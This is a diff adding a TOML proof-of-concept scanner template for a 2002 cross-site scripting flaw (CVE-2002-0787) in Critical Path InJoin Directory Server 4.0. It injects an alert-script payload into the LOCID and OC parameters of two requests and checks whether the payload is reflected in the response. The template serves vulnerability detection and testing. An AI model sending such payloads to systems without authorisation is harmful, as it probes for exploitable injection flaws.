@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "检测 Critical Path InJoin Directory Server 4.0 iCon 管理 Web 界面中的跨站脚本漏洞。通过向 LOCID 或 OC 参数注入恶意脚本，验证服务器是否未正确过滤 HTML 代码。"
+id = "POC-AVE-2002-0444"
+name = "Critical Path InJoin Directory Server 4.0 XSS PoC"
+severity = "high"
+tags = ["ave-2002-0444"]
+vuln_id = [
+    "CVE-2002-0787",
+    "AVE-2002-0444",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/DSASD&DSA=1&LOCID=<script>alert(1)</script>&FRAME=Y"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(1)</script>"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/OBCR&OC=<script>alert(1)</script>&FRAME=Y"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(1)</script>"]
